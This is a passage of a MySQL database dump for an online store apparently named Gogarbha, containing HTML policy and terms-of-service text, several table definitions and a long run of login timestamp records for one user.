SERVICES</strong></p>\r\n<p>In general, the third-party providers used by us will only collect, use and disclose your information to the extent necessary to allow them to perform the services they provide to us.</p>\r\n<p>However, certain third-party service providers, such as payment gateways and other payment transaction processors, have their own privacy policies in respect to the information we are required to provide to them for your purchase-related transactions.<br />For these providers, we recommend that you read their privacy policies so you can understand the manner in which your personal information will be handled by these providers.</p>\r\n<p>In particular, remember that certain providers may be located in or have facilities that are located a different jurisdiction than either you or us. So if you elect to proceed with a transaction that involves the services of a third-party service provider, then your information may become subject to the laws of the jurisdiction(s) in which that service provider or its facilities are located.</p>\r\n<p>Once you leave our store&rsquo;s website or are redirected to a third-party website or application, you are no longer governed by this Privacy Policy or our website&rsquo;s Terms of Service.</p>\r\n<p><strong>LINKS</strong></p>\r\n<p>When you click on links on our store, they may direct you away from our site. We are not responsible for the privacy practices of other sites and encourage you to read their privacy statements.</p>\r\n<p><strong>SECURITY</strong></p>\r\n<p>To protect your personal information, we take reasonable precautions and follow industry best practices to make sure it is not inappropriately lost, misused, accessed, disclosed, altered or destroyed.</p>\r\n<p><strong>AGE OF CONSENT</strong></p>\r\n<p>By using this site, you represent that you are at least the age of majority in your state or province of residence, or that you are the age of majority in your state or province of residence and you have given us your consent to allow any of your minor dependents to use this site.</p>\r\n<p><strong>CHANGES TO THIS PRIVACY POLICY</strong></p>\r\n<p>We reserve the right to modify this privacy policy at any time, so please review it frequently. Changes and clarifications will take effect immediately upon their posting on the website. If we make material changes to this policy, we will notify you here that it has been updated, so that you are aware of what information we collect, how we use it, and under what circumstances, if any, we use and/or disclose it.</p>\r\n<p>If our store is acquired or merged with another company, your information may be transferred to the new owners so that we may continue to sell products to you.</p>\r\n<p>&nbsp;</p>', '<p>For any kind of assitance and information mail us on <a href=\"mailto:info@gogarbha.com\">support@gogarbha.com </a>with your contact details as our team will get back to you within 48 hrs or two working days.</p>', '<p>This is Gogarbha&rsquo;s official website. The entire content of Gogarbha website is for the information purpose only and in order to enable visitors to have a quick and easy access to Gogarbha products, services and other business information, and this is not purport to be legal document.</p>\r\n<p>Though the company takes care, there may be inaccuracies or typographical errors in the information available through it&rsquo;s official website. Website improvements / content modification will be done at specified intervals or as and when the management of the company decides to take up. In case of any variance between what has been stated and what is contained in the relevant Act, Rules, Regulations, Policy Statements, etc, the latter shall prevail.</p>\r\n<p>Commercial use of web contents is prohibited without prior written consent of the company. Gogarbha makes no claims about the reliability, availability, timeliness, lack of viruses or other harmful components and accuracy of the information, software, products, services and related graphics contained within the Gogarbha website for any purpose. All such information, software, products, services and related graphics are provided \"as is\" without warranty of any kind. Gogarbha hereby disclaim all warranties.</p>', '<p><strong>TERMS OF SERVICE</strong></p>\r\n<p>This document is an electronic record in terms of Information Technology Act, 2000 and rules there under as applicable and the amended provisions pertaining to electronic records in various statutes as amended by The Information Technology Act, 2000. This electronic record is generated by a computer system and does not require any physical or digital signatures.</p>\r\n<p><strong>OVERVIEW</strong></p>\r\n<p>This website is operated by Gogarbha . Throughout the site, the terms &ldquo;we&rdquo;, &ldquo;us&rdquo; and &ldquo;our&rdquo; refer to Gogarbha. Gogarbha &nbsp;Products offers this website, including all information, tools and services available from this site to you, the user, conditioned upon your acceptance of all terms, conditions, policies and notices stated here.<br /><br />By visiting our site and/ or purchasing something from us, you engage in our &ldquo;Service&rdquo; and agree to be bound by the following terms and conditions (&ldquo;Terms of Service&rdquo;, &ldquo;Terms&rdquo;), including those additional terms and conditions and policies referenced herein and/or available by hyperlink. These Terms of Service apply to all users of the site, including without limitation users who are browsers, vendors, customers, merchants, and/ or contributors of content.<br /><br />Please read these Terms of Service carefully before accessing or using our website. By accessing or using any part of the site, you agree to be bound by these Terms of Service. If you do not agree to all the terms and conditions of this agreement, then you may not access the website or use any services. If these Terms of Service are considered an offer, acceptance is expressly limited to these Terms of Service.<br /><br />Any new features or tools which are added to the current store shall also be subject to the Terms of Service. You can review the most current version of the Terms of Service at any time on this page. We reserve the right to update, change or replace any part of these Terms of Service by posting updates and/or changes to our website. It is your responsibility to check this page periodically for changes. Your continued use of or access to the website following the posting of any changes constitutes acceptance of those changes.</p>\r\n<p><strong>ONLINE STORE TERMS</strong></p>\r\n<p>By agreeing to these Terms of Service, you represent that you are at least the age of majority in your state or province of residence, or that you are the age of majority in your state or province of residence and you have given us your consent to allow any of your minor dependents to use this site.</p>\r\n<p>You may not use our products for any illegal or unauthorized purpose nor may you, in the use of the Service, violate any laws in your jurisdiction (including but not limited to copyright laws).<br />A breach or violation of any of the Terms will result in an immediate termination of your Services.We reserve the right to refuse service to anyone for any reason at any time.</p>\r\n<p>You understand that your content (not including credit card information), may be transferred unencrypted and involve (a) transmissions over various networks; and (b) changes to confirm and adapt to technical requirements of connecting networks or devices. Credit card information is always encrypted during transfer over networks.<br />You agree not to reproduce, duplicate, copy, sell, resell or exploit any portion of the Service, use of the Service, or access to the Service or any contact on the website through which the service is provided, without express written permission by us.</p>\r\n<p><strong>ACCURACY, COMPLETENESS AND TIMELINESS OF INFORMATION</strong></p>\r\n<p>We are not responsible if information made available on this site is not accurate, complete or current. The material on this site is provided for general information only and should not be relied upon or used as the sole basis for making decisions without consulting primary, more accurate, more complete or more timely sources of information. Any reliance on the material on this site is at your own risk.</p>\r\n<p>We reserve the right to modify the contents of this site at any time, but we have no obligation to update any information on our site. You agree that it is your responsibility to monitor changes to our site.</p>\r\n<p><strong>MODIFICATIONS TO THE SERVICE AND PRICES</strong></p>\r\n<p>Prices for our products are subject to change without notice.</p>\r\n<p>We reserve the right at any time to modify or discontinue the Service (or any part or content thereof) without notice at any time.<br />We shall not be liable to you or to any third-party for any modification, price change, suspension or discontinuance of the Service.</p>\r\n<p><strong>PRODUCTS OR SERVICES (IF APPLICABLE)</strong></p>\r\n<p>Certain products or services may be available exclusively online through the website. These products or services may have limited quantities and are subject to return or exchange only according to our Return Policy.</p>\r\n<p>We have made every effort to display as accurately as possible the colors and images of our products that appear at the store. We cannot guarantee that your computer monitor\'s display of any color will be accurate.</p>\r\n<p>We reserve the right, but are not obligated, to limit the sales of our products or Services to any person, geographic region or jurisdiction. We may exercise this right on a case-by-case basis. We reserve the right to limit the quantities of any products or services that we offer. All descriptions of products or product pricing are subject to change at anytime without notice, at the sole discretion of us. We reserve the right to discontinue any product at any time. Any offer for any product or service made on this site is void where prohibited.</p>\r\n<p>We do not warrant that the quality of any products, services, information, or other material purchased or obtained by you will meet your expectations, or that any errors in the Service will be corrected.</p>\r\n<p><strong>ACCURACY OF BILLING AND ACCOUNT INFORMATION</strong></p>\r\n<p>We reserve the right to refuse any order you place with us. We may, in our sole discretion, limit or cancel quantities purchased per person, per household or per order. These restrictions may include orders placed by or under the same customer account, the same credit card, and/or orders that use the same billing and/or shipping address. In the event that we make a change to or cancel an order, we may attempt to notify you by contacting the e-mail and/or billing address/phone number provided at the time the order was made. We reserve the right to limit or prohibit orders that, in our sole judgment, appear to be placed by dealers, resellers or distributors.<br /><br />You agree to provide current, complete and accurate purchase and account information for all purchases made at our store. You agree to promptly update your account and other information, including your email address and credit card numbers and expiration dates, so that we can complete your transactions and contact you as needed.<br /><br />For more detail, please review our Returns Policy.</p>\r\n<p><strong>THIRD-PARTY LINKS</strong></p>\r\n<p>Certain content, products and services available via our Service may include materials from third-parties.<br />Third-party links on this site may direct you to third-party websites that are not affiliated with us. We are not responsible for examining or evaluating the content or accuracy and we do not warrant and will not have any liability or responsibility for any third-party materials or websites, or for any other materials, products, or services of third-parties.</p>\r\n<p>We are not liable for any harm or damages related to the purchase or use of goods, services, resources, content, or any other transactions made in connection with any third-party websites. Please review carefully the third-party\'s policies and practices and make sure you understand them before you engage in any transaction. Complaints, claims, concerns, or questions regarding third-party products should be directed to the third-party.</p>\r\n<p><strong>USER COMMENTS, FEEDBACK AND OTHER SUBMISSIONS</strong></p>\r\n<p>If, at our request, you send certain specific submissions (for example contest entries) or without a request from us you send creative ideas, suggestions, proposals, plans, or other materials, whether online, by email, by postal mail, or otherwise (collectively, \'comments\'), you agree that we may, at any time, without restriction, edit, copy, publish, distribute, translate and otherwise use in any medium any comments that you forward to us. We are and shall be under no obligation (1) to maintain any comments in confidence; (2) to pay compensation for any comments; or (3) to respond to any comments.</p>\r\n<p>We may, but have no obligation to, monitor, edit or remove content that we determine in our sole discretion are unlawful, offensive, threatening, libelous, defamatory, pornographic, obscene or otherwise objectionable or violates any party&rsquo;s intellectual property or these Terms of Service.</p>\r\n<p>You agree that your comments will not violate any right of any third-party, including copyright, trademark, privacy, personality or other personal or proprietary right. You further agree that your comments will not contain libelous or otherwise unlawful, abusive or obscene material, or contain any computer virus or other malware that could in any way affect the operation of the Service or any related website. You may not use a false e-mail address, pretend to be someone other than yourself, or otherwise mislead us or third-parties as to the origin of any comments. You are solely responsible for any comments you make and their accuracy. We take no responsibility and assume no liability for any comments posted by you or any third-party.</p>\r\n<p><strong>PERSONAL INFORMATION</strong></p>\r\n<p>Your submission of personal information through the store is governed by our Privacy Policy. View our Privacy Policy.</p>\r\n<p><strong>ERRORS, INACCURACIES AND OMISSIONS</strong></p>\r\n<p>Occasionally there may be information on our site or in the Service that contains typographical errors, inaccuracies or omissions that may relate to product descriptions, pricing, promotions, offers, product shipping charges, transit times and availability. We reserve the right to correct any errors, inaccuracies or omissions, and to change or update information or cancel orders if any information in the Service or on any related website is inaccurate at any time without prior notice (including after you have submitted your order).<br />We undertake no obligation to update, amend or clarify information in the Service or on any related website, including without limitation, pricing information, except as required by law. No specified update or refresh date applied in the Service or on any related website, should be taken to indicate that all information in the Service or on any related website has been modified or updated.</p>\r\n<p><strong>PROHIBITED USES</strong></p>\r\n<p>In addition to other prohibitions as set forth in the Terms of Service, you are prohibited from using the site or its content: (a) for any unlawful purpose; (b) to solicit others to perform or participate in any unlawful acts; (c) to violate any international, federal, provincial or state regulations, rules, laws, or local ordinances; (d) to infringe upon or violate our intellectual property rights or the intellectual property rights of others; (e) to harass, abuse, insult, harm, defame, slander, disparage, intimidate, or discriminate based on gender, sexual orientation, religion, ethnicity, race, age, national origin, or disability; (f) to submit false or misleading information; (g) to upload or transmit viruses or any other type of malicious code that will or may be used in any way that will affect the functionality or operation of the Service or of any related website, other websites, or the Internet; (h) to collect or track the personal information of others; (i) to spam, phish, pharm, pretext, spider, crawl, or scrape; (j) for any obscene or immoral purpose; or (k) to interfere with or circumvent the security features of the Service or any related website, other websites, or the Internet. We reserve the right to terminate your use of the Service or any related website for violating any of the prohibited uses.</p>\r\n<p><strong>LIMITATION OF LIABILITY</strong></p>\r\n<p>We do not guarantee, represent or warrant that your use of our service will be uninterrupted, timely, secure or error-free.<br />We do not warrant that the results that may be obtained from the use of the service will be accurate or reliable.<br />You agree that from time to time we may remove the service for indefinite periods of time or cancel the service at any time, without notice to you.</p>\r\n<p>You expressly agree that your use of, or inability to use, the service is at your sole risk. The service and all products and services delivered to you through the service are (except as expressly stated by us) provided \'as is\' and \'as available\' for your use, without any representation, warranties or conditions of any kind, either express or implied, including all implied warranties or conditions of merchantability, merchantable quality, fitness for a particular purpose, durability, title, and non-infringement.</p>\r\n<p>In no case shall Gogarbha, our directors, officers, employees, affiliates, agents, contractors, interns, suppliers, service providers or licensors be liable for any injury, loss, claim, or any direct, indirect, incidental, punitive, special, or consequential damages of any kind, including, without limitation lost profits, lost revenue, lost savings, loss of data, replacement costs, or any similar damages, whether based in contract, tort (including negligence), strict liability or otherwise, arising from your use of any of the service or any products procured using the service, or for any other claim related in any way to your use of the service or any product, including, but not limited to, any errors or omissions in any content, or any loss or damage of any kind incurred as a result of the use of the service or any content (or product) posted, transmitted, or otherwise made available via the service, even if advised of their possibility. Because some states or jurisdictions do not allow the exclusion or the limitation of liability for consequential or incidental damages, in such states or jurisdictions, our liability shall be limited to the maximum extent permitted by law.</p>\r\n<p><strong>INDEMNIFICATION</strong></p>\r\n<p>You agree to indemnify, defend and hold harmless Vrindavan Desi Cow Products and our parent, subsidiaries, affiliates, partners, officers, directors, agents, contractors, licensors, service providers, subcontractors, suppliers, interns and employees, harmless from any claim or demand, including reasonable attorneys&rsquo; fees, made by any third-party due to or arising out of your breach of these Terms of Service or the documents they incorporate by reference, or your violation of any law or the rights of a third-party.</p>\r\n<p><strong>SEVERABILITY</strong></p>\r\n<p>In the event that any provision of these Terms of Service is determined to be unlawful, void or unenforceable, such provision shall nonetheless be enforceable to the fullest extent permitted by applicable law, and the unenforceable portion shall be deemed to be severed from these Terms of Service, such determination shall not affect the validity and enforceability of any other remaining provisions.</p>\r\n<p><strong>TERMINATION</strong></p>\r\n<p>The obligations and liabilities of the parties incurred prior to the termination date shall survive the termination of this agreement for all purposes.These Terms of Service are effective unless and until terminated by either you or us. You may terminate these Terms of Service at any time by notifying us that you no longer wish to use our Services, or when you cease using our site. If in our sole judgment you fail, or we suspect that you have failed, to comply with any term or provision of these Terms of Service, we also may terminate this agreement at any time without notice and you will remain liable for all amounts due up to and including the date of termination; and/or accordingly may deny you access to our Services (or any part thereof).</p>\r\n<p><strong>ENTIRE AGREEMENT</strong></p>\r\n<p>The failure of us to exercise or enforce any right or provision of these Terms of Service shall not constitute a waiver of such right or provision.These Terms of Service and any policies or operating rules posted by us on this site or in respect to The Service constitutes the entire agreement and understanding between you and us and govern your use of the Service, superseding any prior or contemporaneous agreements, communications and proposals, whether oral or written, between you and us (including, but not limited to, any prior versions of the Terms of Service).Any ambiguities in the interpretation of these Terms of Service shall not be construed against the drafting party.</p>\r\n<p><strong>CHANGES TO TERMS OF SERVICE</strong></p>\r\n<p>You can review the most current version of the Terms of Service at any time at this page.<br />We reserve the right, at our sole discretion, to update, change or replace any part of these Terms of Service by posting updates and changes to our website. It is your responsibility to check our website periodically for changes. Your continued use of or access to our website or the Service following the posting of any changes to these Terms of Service constitutes acceptance of those changes.</p>\r\n<p><strong>CONTACT INFORMATION</strong></p>\r\n<p>Questions about the Terms of Service should be sent to us at <a href=\"mailto:support@gogarbha.com\">support@gogarbha.com</a></p>\r\n<p>&nbsp;</p>\r\n<p>&nbsp;</p>');

-- --------------------------------------------------------

--
-- Table structure for table `gifts`
--

CREATE TABLE `gifts` (
  `id` int(11) NOT NULL,
  `order_no` int(11) NOT NULL,
  `title` text NOT NULL,
  `email` varchar(70) NOT NULL,
  `mphone` varchar(30) NOT NULL,
  `order_details` text NOT NULL,
  `image_path` text NOT NULL,
  `page_url` text NOT NULL,
  `created_date` datetime NOT NULL,
  `modified_date` datetime NOT NULL,
  `user_id` int(11) NOT NULL,
  `status` int(11) NOT NULL
) ENGINE=MyISAM DEFAULT CHARSET=latin1;

-- --------------------------------------------------------

--
-- Table structure for table `gift_products`
--

CREATE TABLE `gift_products` (
  `gift_id` int(11) NOT NULL,
  `pid` int(11) NOT NULL,
  `created_date` datetime NOT NULL
) ENGINE=MyISAM DEFAULT CHARSET=latin1;

-- --------------------------------------------------------

--
-- Table structure for table `login_report`
--

CREATE TABLE `login_report` (
  `user_id` int(11) NOT NULL,
  `login_time` datetime NOT NULL,
  `logout_time` datetime NOT NULL
) ENGINE=MyISAM DEFAULT CHARSET=latin1;

--
-- Dumping data for table `login_report`
--

INSERT INTO `login_report` (`user_id`, `login_time`, `logout_time`) VALUES
(1, '2022-01-28 05:02:40', '2022-01-28 12:24:44'),
(1, '2022-01-28 06:54:49', '0000-00-00 00:00:00'),
(1, '2022-01-28 06:55:29', '0000-00-00 00:00:00'),
(1, '2022-01-28 07:04:22', '2022-01-28 12:35:46'),
(1, '2022-01-28 07:05:51', '2022-01-28 12:37:30'),
(1, '2022-01-28 07:08:09', '0000-00-00 00:00:00'),
(1, '2022-01-28 08:55:58', '0000-00-00 00:00:00'),
(1, '2022-01-28 10:04:21', '2022-01-28 15:42:50'),
(1, '2022-01-28 10:13:14', '2022-01-28 15:43:24'),
(1, '2022-01-28 10:13:51', '2022-01-28 15:45:11'),
(1, '2022-01-28 10:15:16', '2022-01-28 15:46:08'),
(1, '2022-01-28 10:16:20', '0000-00-00 00:00:00'),
(1, '2022-01-28 10:17:20', '0000-00-00 00:00:00'),
(1, '2022-01-28 10:52:10', '2022-01-28 16:22:36'),
(1, '2022-01-28 10:53:53', '0000-00-00 00:00:00'),
(1, '2022-01-28 10:57:30', '2022-01-28 16:29:36'),
(1, '2022-01-28 10:59:41', '2022-01-28 16:31:27'),
(1, '2022-01-28 11:01:37', '2022-01-28 16:34:13'),
(1, '2022-01-28 11:04:21', '2022-01-28 16:37:28'),
(1, '2022-01-28 11:07:44', '2022-01-28 16:43:01'),
(1, '2022-01-28 11:13:06', '2022-01-28 16:43:15'),
(1, '2022-01-28 11:13:18', '2022-01-28 16:43:44'),
(1, '2022-01-28 11:13:48', '0000-00-00 00:00:00'),
(1, '2022-01-28 11:14:14', '2022-01-28 16:44:46'),
(1, '2022-01-28 11:14:52', '2022-01-28 16:45:25'),
(1, '2022-01-28 11:15:30', '2022-01-28 16:45:58'),
(1, '2022-01-28 11:16:02', '2022-01-28 16:46:47'),
(1, '2022-01-28 11:16:53', '2022-01-28 16:46:56'),
(1, '2022-01-28 11:17:11', '0000-00-00 00:00:00'),
(1, '2022-01-28 17:00:58', '0000-00-00 00:00:00'),
(1, '2022-01-29 03:42:02', '0000-00-00 00:00:00'),
(1, '2022-01-29 04:16:46', '0000-00-00 00:00:00'),
(1, '2022-01-29 05:38:01', '0000-00-00 00:00:00'),
(1, '2022-01-29 06:05:26', '0000-00-00 00:00:00'),
(1, '2022-01-29 09:13:53', '0000-00-00 00:00:00'),
(1, '2022-01-29 09:41:01', '0000-00-00 00:00:00'),
(1, '2022-01-29 09:57:00', '0000-00-00 00:00:00'),
(1, '2022-01-29 10:31:07', '0000-00-00 00:00:00'),
(1, '2022-01-29 11:30:57', '0000-00-00 00:00:00'),
(1, '2022-01-30 09:02:50', '0000-00-00 00:00:00'),
(1, '2022-01-30 15:32:46', '0000-00-00 00:00:00'),
(1, '2022-01-30 15:55:08', '0000-00-00 00:00:00'),
(1, '2022-01-31 04:03:23', '0000-00-00 00:00:00'),
(1, '2022-01-31 06:00:45', '0000-00-00 00:00:00'),
(1, '2022-01-31 06:37:42', '0000-00-00 00:00:00'),
(1, '2022-01-31 12:14:53', '0000-00-00 00:00:00'),
(1, '2022-02-01 04:14:19', '0000-00-00 00:00:00'),
(1, '2022-02-01 06:35:29', '0000-00-00 00:00:00'),
(1, '2022-02-01 11:20:36', '0000-00-00 00:00:00'),
(1, '2022-02-01 11:37:30', '0000-00-00 00:00:00'),
(1, '2022-02-03 03:56:52', '0000-00-00 00:00:00'),
(1, '2022-02-03 07:23:44', '0000-00-00 00:00:00'),
(1, '2022-02-04 04:24:32', '0000-00-00 00:00:00'),
(1, '2022-02-06 06:08:34', '0000-00-00 00:00:00'),
(1, '2022-02-06 06:21:05', '0000-00-00 00:00:00'),
(1, '2022-02-07 03:33:54', '0000-00-00 00:00:00'),
(1, '2022-02-07 04:08:35', '0000-00-00 00:00:00'),
(1, '2022-02-07 12:33:06', '0000-00-00 00:00:00'),
(1, '2022-02-07 13:00:15', '0000-00-00 00:00:00'),
(1, '2022-02-08 03:41:56', '0000-00-00 00:00:00'),
(1, '2022-02-08 04:56:43', '0000-00-00 00:00:00'),
(1, '2022-02-08 07:30:33', '0000-00-00 00:00:00'),
(1, '2022-02-08 09:53:29', '0000-00-00 00:00:00'),
(1, '2022-02-09 03:19:13', '0000-00-00 00:00:00'),
(1, '2022-02-09 04:18:14', '0000-00-00 00:00:00'),
(1, '2022-02-09 06:00:46', '0000-00-00 00:00:00'),
(1, '2022-02-09 16:10:18', '0000-00-00 00:00:00'),
(1, '2022-02-10 07:45:08', '0000-00-00 00:00:00'),
(1, '2022-02-10 08:27:33', '0000-00-00 00:00:00'),
(1, '2022-02-10 09:39:29', '0000-00-00 00:00:00'),
(1, '2022-02-10 15:12:10', '0000-00-00 00:00:00'),
(1, '2022-02-11 04:54:00', '0000-00-00 00:00:00'),
(1, '2022-02-11 07:20:30', '0000-00-00 00:00:00'),
(1, '2022-02-11 08:58:12', '0000-00-00 00:00:00'),
(1, '2022-02-11 09:31:15', '0000-00-00 00:00:00'),
(1, '2022-02-11 12:28:27', '0000-00-00 00:00:00'),
(1, '2022-02-12 04:03:07', '0000-00-00 00:00:00'),
(1, '2022-02-13 08:15:28', '0000-00-00 00:00:00'),
(1, '2022-02-14 04:30:15', '0000-00-00 00:00:00'),
(1, '2022-02-14 10:02:11', '0000-00-00 00:00:00'),
(1, '2022-02-14 12:10:40', '0000-00-00 00:00:00'),
(1, '2022-02-15 04:16:07', '0000-00-00 00:00:00'),
(1, '2022-02-15 05:47:34', '2022-02-15 11:56:19'),
(1, '2022-02-15 06:28:32', '0000-00-00 00:00:00'),
(1, '2022-02-15 09:22:41', '0000-00-00 00:00:00'),
(1, '2022-02-15 11:14:11', '2022-02-15 18:05:05'),
(1, '2022-02-15 15:49:30', '0000-00-00 00:00:00'),
(1, '2022-02-16 03:37:15', '0000-00-00 00:00:00'),
(1, '2022-02-16 05:24:07', '0000-00-00 00:00:00'),
(1, '2022-02-16 05:49:28', '2022-02-16 12:06:36'),
(1, '2022-02-16 16:28:55', '0000-00-00 00:00:00'),
(1, '2022-02-17 04:04:15', '0000-00-00 00:00:00'),
(1, '2022-02-17 04:32:51', '0000-00-00 00:00:00'),
(1, '2022-02-17 04:52:31', '0000-00-00 00:00:00'),
(1, '2022-02-17 07:03:01', '0000-00-00 00:00:00'),
(1, '2022-02-17 10:11:00', '0000-00-00 00:00:00'),
(1, '2022-02-17 10:17:16', '0000-00-00 00:00:00'),
(1, '2022-02-17 14:39:42', '0000-00-00 00:00:00'),
(1, '2022-02-18 04:06:09', '0000-00-00 00:00:00'),
(1, '2022-02-18 05:41:12', '0000-00-00 00:00:00'),
(1, '2022-02-18 05:46:38', '0000-00-00 00:00:00'),
(1, '2022-02-18 06:07:06', '2022-02-18 12:11:21'),
(1, '2022-02-18 10:05:02', '0000-00-00 00:00:00'),
(1, '2022-02-18 14:36:13', '0000-00-00 00:00:00'),
(1, '2022-02-18 14:46:19', '0000-00-00 00:00:00'),
(1, '2022-02-19 14:34:51', '0000-00-00 00:00:00'),
(1, '2022-02-20 04:57:57', '0000-00-00 00:00:00'),
(1, '2022-02-21 04:36:21', '0000-00-00 00:00:00'),
(1, '2022-02-21 05:10:18', '0000-00-00 00:00:00'),
(1, '2022-02-21 09:06:24', '0000-00-00 00:00:00'),
(1, '2022-02-22 05:26:33', '0000-00-00 00:00:00'),
(1, '2022-02-22 06:09:53', '0000-00-00 00:00:00'),
(1, '2022-02-22 06:47:14', '2022-02-22 12:23:20'),
(1, '2022-02-22 07:25:54', '0000-00-00 00:00:00'),
(1, '2022-02-23 05:16:34', '0000-00-00 00:00:00'),
(1, '2022-02-23 05:32:25', '0000-00-00 00:00:00'),
(1, '2022-02-23 07:02:18', '0000-00-00 00:00:00'),
(1, '2022-02-23 07:36:16', '0000-00-00 00:00:00'),
(1, '2022-02-23 15:59:07', '0000-00-00 00:00:00'),
(1, '2022-02-24 04:08:49', '0000-00-00 00:00:00'),
(1, '2022-02-24 04:36:40', '0000-00-00 00:00:00'),
(1, '2022-02-24 10:26:43', '0000-00-00 00:00:00'),
(1, '2022-02-24 14:21:05', '0000-00-00 00:00:00'),
(1, '2022-02-24 14:29:25', '0000-00-00 00:00:00'),
(1, '2022-02-25 03:56:32', '0000-00-00 00:00:00'),
(1, '2022-02-25 03:59:26', '0000-00-00 00:00:00'),
(1, '2022-02-25 05:36:36', '0000-00-00 00:00:00'),
(1, '2022-02-25 06:17:03', '0000-00-00 00:00:00'),
(1, '2022-02-25 07:41:07', '0000-00-00 00:00:00'),
(1, '2022-02-25 10:36:50', '0000-00-00 00:00:00'),
(1, '2022-02-26 04:17:30', '0000-00-00 00:00:00'),
(1, '2022-02-26 07:14:36', '0000-00-00 00:00:00'),
(1, '2022-02-27 04:57:48', '0000-00-00 00:00:00'),
(1, '2022-02-27 04:59:33', '0000-00-00 00:00:00'),
(1, '2022-02-27 06:26:36', '0000-00-00 00:00:00'),
(1, '2022-02-27 06:50:46', '0000-00-00 00:00:00'),
(1, '2022-02-27 09:22:38', '0000-00-00 00:00:00'),
(1, '2022-02-27 15:02:55', '0000-00-00 00:00:00'),
(1, '2022-02-28 04:04:42', '0000-00-00 00:00:00'),
(1, '2022-02-28 10:33:47', '0000-00-00 00:00:00'),
(1, '2022-02-28 12:25:31', '2022-02-28 18:16:05'),
(1, '2022-03-01 03:12:44', '0000-00-00 00:00:00'),
(1, '2022-03-01 07:44:39', '0000-00-00 00:00:00'),
(1, '2022-03-01 11:24:04', '0000-00-00 00:00:00'),
(1, '2022-03-02 05:29:23', '0000-00-00 00:00:00'),
(1, '2022-03-02 06:22:05', '0000-00-00 00:00:00'),
(1, '2022-03-02 06:45:53', '0000-00-00 00:00:00'),
(1, '2022-03-02 09:43:59', '0000-00-00 00:00:00'),
(1, '2022-03-02 10:12:43', '2022-03-02 16:37:46'),
(1, '2022-03-03 04:21:39', '0000-00-00 00:00:00'),
(1, '2022-03-03 08:39:02', '0000-00-00 00:00:00'),
(1, '2022-03-03 14:51:41', '0000-00-00 00:00:00'),
(1, '2022-03-06 13:58:03', '0000-00-00 00:00:00'),
(1, '2022-03-07 04:30:18', '0000-00-00 00:00:00'),
(1, '2022-03-08 05:16:27', '0000-00-00 00:00:00'),
(1, '2022-03-08 05:51:52', '0000-00-00 00:00:00'),
(1, '2022-03-08 06:07:21', '0000-00-00 00:00:00'),
(1, '2022-03-08 06:39:07', '2022-03-08 12:14:29'),
(1, '2022-03-08 15:33:13', '0000-00-00 00:00:00'),
(1, '2022-03-09 05:13:36', '0000-00-00 00:00:00'),
(1, '2022-03-09 05:38:41', '2022-03-09 11:33:15'),
(1, '2022-03-09 07:10:08', '2022-03-09 12:41:17'),
(1, '2022-03-09 10:41:30', '0000-00-00 00:00:00'),
(1, '2022-03-09 10:42:22', '0000-00-00 00:00:00'),
(1, '2022-03-09 10:59:12', '0000-00-00 00:00:00'),
(1, '2022-03-09 12:01:55', '0000-00-00 00:00:00'),
(1, '2022-03-10 03:49:28', '0000-00-00 00:00:00'),
(1, '2022-03-10 07:40:24', '0000-00-00 00:00:00'),
(1, '2022-03-11 09:38:56', '0000-00-00 00:00:00'),
(1, '2022-03-11 10:28:35', '2022-03-11 16:50:43'),
(1, '2022-03-12 04:11:59', '0000-00-00 00:00:00'),
(1, '2022-03-12 09:33:34', '0000-00-00 00:00:00'),
(1, '2022-03-12 15:38:57', '0000-00-00 00:00:00'),
(1, '2022-03-17 07:11:49', '2022-03-17 07:28:47'),
(1, '2022-03-17 07:50:51', '2022-03-17 08:09:50'),
(1, '2022-03-17 08:10:04', '2022-03-17 08:16:45'),
(1, '2022-03-17 08:17:01', '0000-00-00 00:00:00'),
(1, '2022-03-17 08:17:35', '2022-03-17 08:20:36'),
(1, '2022-03-17 08:21:59', '0000-00-00 00:00:00'),
(1, '2022-03-17 08:32:40', '0000-00-00 00:00:00'),
(1, '2022-03-17 08:57:23', '0000-00-00 00:00:00'),
(1, '2022-03-17 12:14:07', '2022-03-18 04:35:15'),
(1, '2022-03-18 04:35:42', '0000-00-00 00:00:00'),
(1, '2022-03-18 06:08:27', '0000-00-00 00:00:00'),
(1, '2022-03-18 06:13:36', '0000-00-00 00:00:00'),
(1, '2022-03-19 06:48:37', '0000-00-00 00:00:00'),
(1, '2022-03-21 05:21:14', '0000-00-00 00:00:00'),
(1, '2022-03-21 05:21:41', '0000-00-00 00:00:00'),
(1, '2022-03-21 05:24:57', '0000-00-00 00:00:00'),
(1, '2022-03-21 10:39:40', '0000-00-00 00:00:00'),
(1, '2022-03-21 12:37:32', '2022-03-21 12:37:36'),
(1, '2022-03-21 12:37:54', '2022-03-21 12:46:50'),
(1, '2022-03-22 04:10:52', '0000-00-00 00:00:00'),
(1, '2022-03-22 05:21:31', '2022-03-22 12:22:28'),
(1, '2022-03-23 05:05:21', '0000-00-00 00:00:00'),
(1, '2022-03-23 09:16:05', '0000-00-00 00:00:00'),
(1, '2022-03-23 11:09:09', '0000-00-00 00:00:00'),
(1, '2022-03-23 15:48:21', '0000-00-00 00:00:00'),
(1, '2022-03-24 05:44:46', '2022-03-24 08:51:40'),
(1, '2022-03-24 08:55:24', '0000-00-00 00:00:00'),
(1, '2022-03-24 09:52:50', '2022-03-24 10:17:31'),
(1, '2022-03-24 15:02:41', '0000-00-00 00:00:00'),
(1, '2022-03-25 05:36:28', '0000-00-00 00:00:00'),
(1, '2022-03-25 09:04:04', '2022-03-25 10:07:02'),
(1, '2022-03-25 10:07:34', '0000-00-00 00:00:00'),
(1, '2022-03-25 10:08:28', '2022-03-25 11:15:03'),
(1, '2022-03-25 11:15:22', '0000-00-00 00:00:00'),
(1, '2022-03-25 12:16:37', '0000-00-00 00:00:00'),
(1, '2022-03-25 12:24:44', '2022-03-25 12:41:41'),
(1, '2022-03-25 12:42:42', '0000-00-00 00:00:00'),
(1, '2022-03-25 12:42:43', '2022-03-25 12:56:31'),
(1, '2022-03-26 03:48:52', '0000-00-00 00:00:00'),
(1, '2022-03-26 03:49:44', '0000-00-00 00:00:00'),
(1, '2022-03-26 04:12:58', '0000-00-00 00:00:00'),
(1, '2022-03-26 04:30:42', '2022-03-26 05:19:36'),
(1, '2022-03-26 05:20:04', '0000-00-00 00:00:00'),
(1, '2022-03-26 06:35:55', '0000-00-00 00:00:00'),
(1, '2022-03-26 06:41:53', '0000-00-00 00:00:00'),
(1, '2022-03-26 06:56:45', '2022-03-26 09:49:21'),
(1, '2022-03-26 09:49:25', '2022-03-26 11:01:40'),
(1, '2022-03-28 02:56:08', '0000-00-00 00:00:00'),
(1, '2022-03-28 03:53:54', '0000-00-00 00:00:00'),
